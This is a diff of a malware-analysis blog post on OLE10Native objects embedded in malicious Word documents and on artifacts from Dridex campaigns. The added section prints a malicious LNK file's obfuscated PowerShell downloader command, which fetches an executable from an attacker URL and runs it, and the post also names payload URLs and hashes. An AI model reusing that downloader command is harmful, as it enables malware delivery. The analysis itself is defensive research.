@@ -1,8 +1,8 @@
 ## Exploring OLE10Native streams within malicious Microsoft Word documents
 
-In the past year embedding executable code within Word documents has become more prevalent. Microsoft wrote an excellent [article](https://blogs.technet.microsoft.com/mmpc/2016/06/14/wheres-the-macro-malware-author-are-now-using-ole-embedding-to-deliver-malicious-files/) about the rise of this technique back in June 2016. Microsoft mentions some technical details of the payload but didn't dive into how the objects were embedded. Recently while coding  a carver for embedded OLE10Native objects, I came across some artifacts that I thought were interesting.
+In the past year embedding executable code within Word documents has become more prevalent. Microsoft wrote an excellent [article](https://blogs.technet.microsoft.com/mmpc/2016/06/14/wheres-the-macro-malware-author-are-now-using-ole-embedding-to-deliver-malicious-files/) about the rise of this technique back in June 2016. Recently while coding  a carver for embedded OLE10Native objects, I came across some artifacts that I thought were interesting.
 
-Native data stored in a Microsoft Office document is stored in a stream object named `\1Ole10Native`. The stored data which could be a Visual Basic Script (.VBS), executable (.exe) or a .LNK file are known as [embedded objects](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679749(v=vs.85).aspx).  I'd like to note that there are many different type of embedded objects and streams. `\1Ole10Native` is just one type used to store native data that was copied and pasted or dragged and dropped into a document.  Extracting OLE10Native objects within Word documents can be done with the following steps. 
+Native data stored in a Microsoft Office document is stored in a stream object named `\1Ole10Native`. The stored data could be a Visual Basic Script (.VBS), executable (.exe) or a .LNK file are known as [embedded objects](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679749(v=vs.85).aspx).  I'd like to note that there are many different type of embedded objects and streams. `\1Ole10Native` is just one type used to store native data that was copied and pasted or dragged and dropped into a document.  Extracting OLE10Native objects within Word documents can be done with the following steps. 
 
  1. The documents needs to be unzipped.
  2. The OLE Compound File Binary Format needs to be read.
@@ -276,7 +276,27 @@ Z:\home\localhost\www\jse\1485971059-854.js C:\Users\my\AppData\Local\Temp\14859
 Z:\js loader\REMOVED_UNICODE_\invoice 26.01.2017\invoice 26.01.2017.js C:\Users\my\AppData\Local\Temp\invoice 26.01.2017.js invoice 26.01.2017.js
 Z:\Users\calvinfong\Desktop\Spam & Virus\eicar.com Z:\Users\CALVIN~1\AppData\Local\Temp\eicar.com eicar.com
 ```
-For the `file_path` field 595 used the C drive and 275 used a mounted or network drive. 
+For the `file_path` field 595 used the C drive and 275 used a mounted or network drive. Virtual Machines is one possible reason why mounted drives are so common. Tools used in Dridex campaign (explained in next section) contain evidence that they were created in VirtualBox. For example, Invoice 9840018.lnk is a Shell Link LNK file. This file format contains the Mac Address of the host that created the file. For Invoice 9840018.lnk, it has a MAC Address of 08:00:27:40:ee:a9 which has a Mac Vendor of CADMUS COMPUTER SYSTEMS. Which is the Mac Vendor name for Mac Addresses created by Virtual Box. The following output is from Eric Zimmerman's [LECmd](https://github.com/EricZimmerman/LECmd) LNK explorer. 
+
+```
+...
+Name: nKJbajskd qwge8712y981y328912gh3iu12bhwq jqwhjd hqwdhjqjhhhhhhweqweqwe
+Working Directory: %currentdir%
+Arguments: /r powershell -command (New-Object Net.WebClient).("'Downl' + 'oadfile'").invoke('http://challengegx.top/vagina/pussy/sso5sok.php','%TMP%\notepad.exe');(New-Object -com Shell.Application).ShellExecute('%TMP%\notepad.exe');
+Icon Location: %SystemRoot%\system32\SHELL32.dll
+....
+>> Tracker database block
+   Machine ID: azaz-za
+   MAC Address: 08:00:27:40:ee:a9
+   MAC Vendor: CADMUS COMPUTER SYSTEMS
+   Creation: 2015-08-04 04:19:45
+
+   Volume Droid: 6595771e-78a2-4b30-8884-d59f468d8d87
+   Volume Droid Birth: 6595771e-78a2-4b30-8884-d59f468d8d87
+   File Droid: 097b1289-3a60-11e5-beb2-08002740eea9
+   File Droid birth: 097b1289-3a60-11e5-beb2-08002740eea9
+```
+
 
 #### Campaigns
 As demonstrated in the file types and file names section above the Adobe `.scr` files were the most common. They use mounted drives, a folder depth of three and the child folder using an integer as the name. The folder names are likely affiliates ids. All of the `.scr` files have unique hashes. 
@@ -327,3 +347,10 @@ E:\TEMP\G\01.11.16\httpchallengegx.topvaginapussysso5sok.php\Invoice 9840018.lnk
 E:\TEMP\G\21.11.16\http___jetravaille-et-jetaide.ch_resellers_web_request-a-callback.php\Beleg Nr. 832777-99.LNK
 ```
 The child folder appears to be named after the URL that is hosting the second stage. For example. the last path of `E:\TEMP\G\21.11.16\http___jetravaille-et-jetaide.ch_resellers_web_request-a-callback.php\Beleg Nr. 832777-99.LNK`This path is from a Word document named `Rechn. Nr. 2016.11. #18989.docx` with a SHA256 hash of `d9a294980d3e6950afac1bd7871bb40ad7c4172506ff1c996ad272c269831edf`. On  November 21st 2016 someone uploaded the file to [reverse.it](https://www.reverse.it/sample/d9a294980d3e6950afac1bd7871bb40ad7c4172506ff1c996ad272c269831edf?environmentId=100&lang=en). This is the same date as shown in the folder path `E:\TEMP\G\21.11.16`.  When the Word Documented is opened it will open an .LNK file which writes a PowerShell script that downloads an executable from `http://jetravaille-et-jetaide.ch/resellers/web/request-a-callback.php`. This URL is the name of folder that `Beleg Nr. 832777-99.LNK` is stored in.  The downloaded payload with a SHA256 hash of `adf616dd647f029e05726afc5ee5b11f90acbd9f72fcd1d8efed86c387fe390a` has been [identified](https://www.virustotal.com/en/file/adf616dd647f029e05726afc5ee5b11f90acbd9f72fcd1d8efed86c387fe390a/analysis/) as Dridex.
+
+
+#### References
+* https://code.msdn.microsoft.com/office/CSOfficeDocumentFileExtract-e5afce86
+* https://miztakenjoshi.wordpress.com/2008/05/30/ole10native/
+* https://github.com/unixfreak0037/officeparser/blob/master/officeparser.py
+* https://blog.didierstevens.com/page/2/?s=plugin
